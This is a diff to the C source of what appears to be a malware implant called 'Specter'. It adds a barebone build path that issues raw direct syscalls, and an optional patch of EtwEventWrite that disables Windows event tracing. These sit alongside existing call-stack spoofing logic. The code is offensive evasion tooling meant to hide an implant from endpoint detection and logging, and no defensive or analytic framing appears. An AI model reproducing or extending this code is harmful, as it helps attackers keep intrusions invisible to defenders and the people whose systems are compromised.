@@ -59,6 +59,9 @@ NTSTATUS evasion_init(IMPLANT_CONTEXT *ctx) {
        fails, evasion_syscall falls through to raw spec_syscall */
     ctx->evasion_ctx = &g_evasion_ctx;
 
+#ifdef SPECTER_BAREBONE
+    return STATUS_SUCCESS;
+#else
     /* Initialize frame library for call stack spoofing.
        Failure is non-fatal: evasion_syscall falls back to raw
        spec_syscall when frame_lib.count == 0. */
@@ -82,7 +85,14 @@ NTSTATUS evasion_init(IMPLANT_CONTEXT *ctx) {
         (void)pdata_status;  /* Non-fatal */
     }
 
+    /* User-mode ETW patch (EtwEventWrite) — opt-in; see EVASION_FLAG_ETW_USERMODE_PATCH */
+    if (eflags & EVASION_FLAG_ETW_USERMODE_PATCH) {
+        NTSTATUS etw_status = evasion_patch_etw(&g_evasion_ctx);
+        (void)etw_status;  /* Non-fatal */
+    }
+
     return status;
+#endif
 }
 
 /* ------------------------------------------------------------------ */
@@ -108,6 +118,11 @@ NTSTATUS evasion_syscall(EVASION_CONTEXT *ctx, DWORD func_hash, ...) {
         a[i] = va_arg(ap, QWORD);
     va_end(ap);
 
+#ifdef SPECTER_BAREBONE
+    return spec_syscall(e->ssn, e->syscall_addr,
+        a[0], a[1], a[2], a[3], a[4], a[5],
+        a[6], a[7], a[8], a[9], a[10], a[11]);
+#else
     NTSTATUS result;
 
     if (!ctx || ctx->frame_lib.count == 0) {
@@ -149,4 +164,5 @@ NTSTATUS evasion_syscall(EVASION_CONTEXT *ctx, DWORD func_hash, ...) {
         evasion_restore_stack(&saved);
 
     return result;
+#endif
 }
